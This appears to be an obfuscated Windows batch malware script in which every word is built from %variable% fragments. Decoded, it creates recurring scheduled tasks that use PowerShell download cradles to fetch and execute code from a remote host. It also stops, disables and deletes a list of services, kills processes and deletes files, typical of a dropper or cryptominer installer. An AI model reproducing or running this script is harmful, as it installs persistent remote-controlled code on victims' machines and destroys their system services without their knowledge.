(%bysdcmi%%fynwfvh%%rmyyyjm%-%nutqtmu%%bpltpmn%%mnmpqbg%%fynwfvh%%khoziql%%flbzyhx% %bysdcmi%%fynwfvh%%flbzyhx%.%rmyyyjm%%fynwfvh%%bpltpmn%%khoziql%%mkmhtbo%%pjdvllg%%fynwfvh%%bysdcmi%%flbzyhx%).%tjxpouf%%nutqtmu%%rmyyyjm%%bysdcmi%%mkmhtbo%%nutqtmu%%wegkoem%%tjxpouf%%ybbwhci%%flbzyhx%%xlnlrpz%%pjdvllg%%bysdcmi%%dskbaxq%('%yvyapob%%flbzyhx%%flbzyhx%%brlbmmf%://%yvyapob%%brlbmmf%%ybbwhci%%mnmpqbg%.%gfuxihu%%pjdvllg%%xlnlrpz%%fynwfvh%%rmyyyjm%%wegkoem%%mkmhtbo%%mkmhtbo%-%dskbaxq%%wegkoem%%flbzyhx%%fynwfvh%%rmyyyjm%%wegkoem%%tjtkrhi%.%bysdcmi%%fynwfvh%%flbzyhx%:80/%yvyapob%%brlbmmf%%mnmpqbg%%ybbwhci%.%brlbmmf%%yvyapob%%brlbmmf%');"


%ybbwhci%%khoziql%%yvyapob%%flbzyhx%%wegkoem%%ybbwhci%%eeuyvwk%%ybbwhci% /%khoziql%%xlnlrpz%%fynwfvh%%wegkoem%%flbzyhx%%fynwfvh% /%ybbwhci%%khoziql% %hxiqvtv%%pjdvllg%%bysdcmi%%jxdklrj%%flbzyhx%%fynwfvh% /%hxiqvtv%%nutqtmu% 60 /%gfuxihu% /%flbzyhx%%bysdcmi% %wegkoem%%khoziql%%yvyapob%%xlnlrpz%%nutqtmu%%hxiqvtv%%fynwfvh%%jxdklrj%%brlbmmf%%tjxpouf%%wegkoem%%flbzyhx%%fynwfvh%%xlnlrpz% /%flbzyhx%%xlnlrpz% "%brlbmmf%%nutqtmu%%rmyyyjm%%fynwfvh%%xlnlrpz%%ybbwhci%%yvyapob%%fynwfvh%%mkmhtbo%%mkmhtbo% -%rmyyyjm% %yvyapob%%pjdvllg%%tjxpouf%%tjxpouf%%fynwfvh%%bysdcmi% \"%wegkoem%%tjxpouf%%tjxpouf%-%flbzyhx%%tjtkrhi%%brlbmmf%%fynwfvh% -%wegkoem%%ybbwhci%%ybbwhci%%fynwfvh%%hxiqvtv%%bpltpmn%%mkmhtbo%%tjtkrhi%%bysdcmi%%wegkoem%%hxiqvtv%%fynwfvh% %ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%.%khoziql%%nutqtmu%%xlnlrpz%%fynwfvh%;%pjdvllg%%fynwfvh%%lxckycu% (%bysdcmi%%fynwfvh%%rmyyyjm%-%nutqtmu%%bpltpmn%%mnmpqbg%%fynwfvh%%khoziql%%flbzyhx% %bysdcmi%%fynwfvh%%flbzyhx%.%rmyyyjm%%fynwfvh%%bpltpmn%%khoziql%%mkmhtbo%%pjdvllg%%fynwfvh%%bysdcmi%%flbzyhx%).%tjxpouf%%nutqtmu%%rmyyyjm%%bysdcmi%%mkmhtbo%%nutqtmu%%wegkoem%%tjxpouf%%ybbwhci%%flbzyhx%%xlnlrpz%%pjdvllg%%bysdcmi%%dskbaxq%(''%yvyapob%%flbzyhx%%flbzyhx%%brlbmmf%://%yvyapob%%brlbmmf%%ybbwhci%%mnmpqbg%.%gfuxihu%%pjdvllg%%xlnlrpz%%fynwfvh%%rmyyyjm%%wegkoem%%mkmhtbo%%mkmhtbo%-%dskbaxq%%wegkoem%%flbzyhx%%fynwfvh%%rmyyyjm%%wegkoem%%tjtkrhi%.%bysdcmi%%fynwfvh%%flbzyhx%:80/%yvyapob%%brlbmmf%%mnmpqbg%%ybbwhci%.%brlbmmf%%yvyapob%%brlbmmf%''');\""

%ybbwhci%%khoziql%%yvyapob%%flbzyhx%%wegkoem%%ybbwhci%%eeuyvwk%%ybbwhci% /%gfuxihu% /%khoziql%%xlnlrpz%%fynwfvh%%wegkoem%%flbzyhx%%fynwfvh% /%ybbwhci%%khoziql% %hxiqvtv%%pjdvllg%%bysdcmi%%jxdklrj%%flbzyhx%%fynwfvh% /%hxiqvtv%%nutqtmu% 60 /%flbzyhx%%bysdcmi% %wegkoem%%khoziql%%yvyapob%%xlnlrpz%%nutqtmu%%hxiqvtv%%fynwfvh%%jxdklrj%%brlbmmf%%tjxpouf%%wegkoem%%flbzyhx%%fynwfvh%%xlnlrpz%%pjdvllg% /%flbzyhx%%xlnlrpz% "%brlbmmf%%nutqtmu%%rmyyyjm%%fynwfvh%%xlnlrpz%%ybbwhci%%yvyapob%%fynwfvh%%mkmhtbo%%mkmhtbo%.%fynwfvh%%lxckycu%%fynwfvh% -%rmyyyjm% %yvyapob%%pjdvllg%%tjxpouf%%tjxpouf%%fynwfvh%%bysdcmi% '%pjdvllg%%fynwfvh%%lxckycu% (%bysdcmi%%fynwfvh%%rmyyyjm%-%nutqtmu%%bpltpmn%%mnmpqbg%%fynwfvh%%khoziql%%flbzyhx% %bysdcmi%%fynwfvh%%flbzyhx%.%rmyyyjm%%fynwfvh%%bpltpmn%%khoziql%%mkmhtbo%%pjdvllg%%fynwfvh%%bysdcmi%%flbzyhx%).%tjxpouf%%nutqtmu%%rmyyyjm%%bysdcmi%%mkmhtbo%%nutqtmu%%wegkoem%%tjxpouf%%ybbwhci%%flbzyhx%%xlnlrpz%%pjdvllg%%bysdcmi%%dskbaxq%(''%yvyapob%%flbzyhx%%flbzyhx%%brlbmmf%://%yvyapob%%brlbmmf%%ybbwhci%%mnmpqbg%.%gfuxihu%%pjdvllg%%xlnlrpz%%fynwfvh%%rmyyyjm%%wegkoem%%mkmhtbo%%mkmhtbo%-%dskbaxq%%wegkoem%%flbzyhx%%fynwfvh%%rmyyyjm%%wegkoem%%tjtkrhi%.%bysdcmi%%fynwfvh%%flbzyhx%:443/%jxdklrj%%tjxpouf%%tjxpouf%%pjdvllg%%fynwfvh%%lxckycu%%brlbmmf%%mkmhtbo%%nutqtmu%%xlnlrpz%%fynwfvh%%xlnlrpz%''');'"

%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %tjxpouf%%fynwfvh%%mkmhtbo%%fynwfvh%%flbzyhx%%fynwfvh% %rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %rmyyyjm%%tjxpouf%%bysdcmi%%pjdvllg%%ybbwhci%%ybbwhci%%cbwqklh%%khoziql%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %rmyyyjm%%tjxpouf%%bysdcmi%%pjdvllg%%ybbwhci%%ybbwhci%%cbwqklh%%khoziql% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %tjxpouf%%fynwfvh%%mkmhtbo%%fynwfvh%%flbzyhx%%fynwfvh% %rmyyyjm%%tjxpouf%%bysdcmi%%pjdvllg%%ybbwhci%%ybbwhci%%cbwqklh%%khoziql%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %ybbwhci%%fynwfvh%%bysdcmi%%ybbwhci%%fynwfvh%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %ybbwhci%%fynwfvh%%bysdcmi%%ybbwhci%%fynwfvh% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %tjxpouf%%fynwfvh%%mkmhtbo%%fynwfvh%%flbzyhx%%fynwfvh% %ybbwhci%%fynwfvh%%bysdcmi%%ybbwhci%%fynwfvh%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %rmyyyjm%%jxdklrj%%wegkoem%%jxdklrj%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %rmyyyjm%%jxdklrj%%wegkoem%%jxdklrj%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %jxdklrj%%ybbwhci%%nutqtmu%%ybbwhci%%cbwqklh%%khoziql%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %jxdklrj%%ybbwhci%%nutqtmu%%ybbwhci%%cbwqklh%%khoziql% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %rmyyyjm%%wegkoem%%wegkoem%%ybbwhci%%hxiqvtv%%fynwfvh%%tjxpouf%%pjdvllg%%khoziql%%ybbwhci%%cbwqklh%%khoziql%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %rmyyyjm%%wegkoem%%wegkoem%%ybbwhci%%hxiqvtv%%fynwfvh%%tjxpouf%%pjdvllg%%khoziql%%ybbwhci%%cbwqklh%%khoziql% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %tjxpouf%%fynwfvh%%mkmhtbo%%fynwfvh%%flbzyhx%%fynwfvh% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %ybbwhci%%tjxpouf%%xlnlrpz%%ybbwhci%%cbwqklh%%khoziql%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %ybbwhci%%tjxpouf%%xlnlrpz%%ybbwhci%%cbwqklh%%khoziql% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %rmyyyjm%%ybbwhci%%khoziql%%ybbwhci%%cbwqklh%%khoziql%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %rmyyyjm%%ybbwhci%%khoziql%%ybbwhci%%cbwqklh%%khoziql% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %rmyyyjm%%tjxpouf%%pjdvllg%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%%yvyapob%%nutqtmu%%ybbwhci%%flbzyhx%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %rmyyyjm%%tjxpouf%%pjdvllg%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%%yvyapob%%nutqtmu%%ybbwhci%%flbzyhx% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %rmyyyjm%%tjxpouf%%pjdvllg%%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%%yvyapob%%nutqtmu%%ybbwhci%%flbzyhx%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %rmyyyjm%%tjxpouf%%pjdvllg%%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%%yvyapob%%nutqtmu%%ybbwhci%%flbzyhx% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %pjdvllg%%bysdcmi%%ybbwhci%%flbzyhx%%wegkoem%%mkmhtbo%%mkmhtbo%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %pjdvllg%%bysdcmi%%ybbwhci%%flbzyhx%%wegkoem%%mkmhtbo%%mkmhtbo%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %cbwqklh%%wegkoem%%jxdklrj%%mkmhtbo%%flbzyhx%%ybbwhci%%cbwqklh%%khoziql%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %cbwqklh%%wegkoem%%jxdklrj%%mkmhtbo%%flbzyhx%%ybbwhci%%cbwqklh%%khoziql% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %ybbwhci%%brlbmmf%%nutqtmu%%nutqtmu%%mkmhtbo%%fynwfvh%%xlnlrpz%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %ybbwhci%%brlbmmf%%nutqtmu%%nutqtmu%%mkmhtbo%%fynwfvh%%xlnlrpz% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %mkmhtbo%%pjdvllg%%khoziql%%fynwfvh%%bysdcmi%%ybbwhci%%fynwfvh%%hxiqvtv%%wegkoem%%bysdcmi%%wegkoem%%dskbaxq%%fynwfvh%%xlnlrpz%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %mkmhtbo%%pjdvllg%%khoziql%%fynwfvh%%bysdcmi%%ybbwhci%%fynwfvh%%hxiqvtv%%wegkoem%%bysdcmi%%wegkoem%%dskbaxq%%fynwfvh%%xlnlrpz% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%ybbwhci%%khoziql% %ybbwhci%%flbzyhx%%nutqtmu%%brlbmmf% %tjxpouf%%pjdvllg%%wegkoem%%dskbaxq%%flbzyhx%%xlnlrpz%%wegkoem%%khoziql%%eeuyvwk%
%ybbwhci%%khoziql% %khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq% %tjxpouf%%pjdvllg%%wegkoem%%dskbaxq%%flbzyhx%%xlnlrpz%%wegkoem%%khoziql%%eeuyvwk% %ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%= %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%tjxpouf%
%flbzyhx%%wegkoem%%ybbwhci%%eeuyvwk%%eeuyvwk%%pjdvllg%%mkmhtbo%%mkmhtbo% /%gfuxihu% /%pjdvllg%%hxiqvtv% %ybbwhci%%hxiqvtv%%wegkoem%%xlnlrpz%%flbzyhx%%ybbwhci%%khoziql%%xlnlrpz%%fynwfvh%%fynwfvh%%bysdcmi%.%fynwfvh%%lxckycu%%fynwfvh%
%flbzyhx%%wegkoem%%ybbwhci%%eeuyvwk%%eeuyvwk%%pjdvllg%%mkmhtbo%%mkmhtbo% /%gfuxihu% /%pjdvllg%%hxiqvtv% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%.%fynwfvh%%lxckycu%%fynwfvh%
%khoziql%%tjxpouf% %khoziql%:\
%khoziql%%tjxpouf% %khoziql%:\%brlbmmf%%xlnlrpz%%nutqtmu%%dskbaxq%%xlnlrpz%%wegkoem%%hxiqvtv% %gfuxihu%%pjdvllg%%mkmhtbo%%fynwfvh%%ybbwhci%\
%xlnlrpz%%tjxpouf% /%ybbwhci% /%hoahisa% "%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%"
%xlnlrpz%%tjxpouf% /%ybbwhci% /%hoahisa% "%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz% %wegkoem%%tjxpouf%%cbwqklh%%wegkoem%%bysdcmi%%khoziql%%fynwfvh%%tjxpouf% %flbzyhx%%yvyapob%%xlnlrpz%%fynwfvh%%wegkoem%%flbzyhx% %brlbmmf%%xlnlrpz%%nutqtmu%%flbzyhx%%fynwfvh%%khoziql%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%"
%xlnlrpz%%tjxpouf% /%ybbwhci% /%hoahisa% "%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%"
%khoziql%%tjxpouf% %khoziql%:\%brlbmmf%%xlnlrpz%%nutqtmu%%dskbaxq%%xlnlrpz%%wegkoem%%hxiqvtv% %gfuxihu%%pjdvllg%%mkmhtbo%%fynwfvh%%ybbwhci% (%lxckycu%86)\
%xlnlrpz%%tjxpouf% /%ybbwhci% /%hoahisa% "%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%"
%khoziql%%tjxpouf% %khoziql%:\%brlbmmf%%xlnlrpz%%nutqtmu%%dskbaxq%%xlnlrpz%%wegkoem%%hxiqvtv%%tjxpouf%%wegkoem%%flbzyhx%%wegkoem%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%
%xlnlrpz%%tjxpouf% /%ybbwhci% /%hoahisa% "%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%"
%xlnlrpz%%tjxpouf% /%ybbwhci% /%hoahisa% "%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz% %wegkoem%%tjxpouf%%cbwqklh%%wegkoem%%bysdcmi%%khoziql%%fynwfvh%%tjxpouf% %flbzyhx%%yvyapob%%xlnlrpz%%fynwfvh%%wegkoem%%flbzyhx% %brlbmmf%%xlnlrpz%%nutqtmu%%flbzyhx%%fynwfvh%%khoziql%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%"
%xlnlrpz%%tjxpouf% /%ybbwhci% /%hoahisa% "%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi% %yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%"
%khoziql%%tjxpouf% %khoziql%:\
%khoziql%%tjxpouf% %rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%
%khoziql%%tjxpouf% %ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%32
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%%jxdklrj%%brlbmmf%%tjxpouf%%wegkoem%%flbzyhx%%fynwfvh%%fynwfvh%%mkmhtbo%%fynwfvh%%cbwqklh%%wegkoem%%flbzyhx%%fynwfvh%%tjxpouf%%pjdvllg%%bysdcmi%%ybbwhci%%flbzyhx%%wegkoem%%mkmhtbo%%mkmhtbo%%fynwfvh%%xlnlrpz%.%fynwfvh%%lxckycu%%fynwfvh%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%xlnlrpz%%wegkoem%%tjtkrhi%.%fynwfvh%%lxckycu%%fynwfvh%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%.%fynwfvh%%lxckycu%%fynwfvh%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%%yvyapob%%nutqtmu%%ybbwhci%%flbzyhx%.%fynwfvh%%lxckycu%%fynwfvh%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%khoziql%%fynwfvh%%bysdcmi%%flbzyhx%%fynwfvh%%xlnlrpz%%bpltpmn%%xlnlrpz%%nutqtmu%%eeuyvwk%%fynwfvh%%xlnlrpz%.%tjxpouf%%mkmhtbo%%mkmhtbo%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%khoziql%%fynwfvh%%bysdcmi%%flbzyhx%%fynwfvh%%xlnlrpz%%bpltpmn%%xlnlrpz%%nutqtmu%%eeuyvwk%%fynwfvh%%xlnlrpz%%brlbmmf%%ybbwhci%.%tjxpouf%%mkmhtbo%%mkmhtbo%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%%wegkoem%%dskbaxq%%fynwfvh%%bysdcmi%%flbzyhx%.%tjxpouf%%mkmhtbo%%mkmhtbo%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%%brlbmmf%%xlnlrpz%%nutqtmu%%lxckycu%%tjtkrhi%%ybbwhci%%flbzyhx%%jxdklrj%%bpltpmn%.%tjxpouf%%mkmhtbo%%mkmhtbo%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%%ybbwhci%%ybbwhci%%nutqtmu%.%tjxpouf%%mkmhtbo%%mkmhtbo%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %ybbwhci%%hxiqvtv%%wegkoem%%xlnlrpz%%flbzyhx%%ybbwhci%%khoziql%%xlnlrpz%%fynwfvh%%fynwfvh%%bysdcmi%%ybbwhci%%fynwfvh%%flbzyhx%%flbzyhx%%pjdvllg%%bysdcmi%%dskbaxq%%ybbwhci%.%fynwfvh%%lxckycu%%fynwfvh%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %ybbwhci%%hxiqvtv%%wegkoem%%xlnlrpz%%flbzyhx%%ybbwhci%%khoziql%%xlnlrpz%%fynwfvh%%fynwfvh%%bysdcmi%%brlbmmf%%ybbwhci%.%tjxpouf%%mkmhtbo%%mkmhtbo%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %ybbwhci%%hxiqvtv%%wegkoem%%xlnlrpz%%flbzyhx%%ybbwhci%%khoziql%%xlnlrpz%%fynwfvh%%fynwfvh%%bysdcmi%.%fynwfvh%%lxckycu%%fynwfvh%
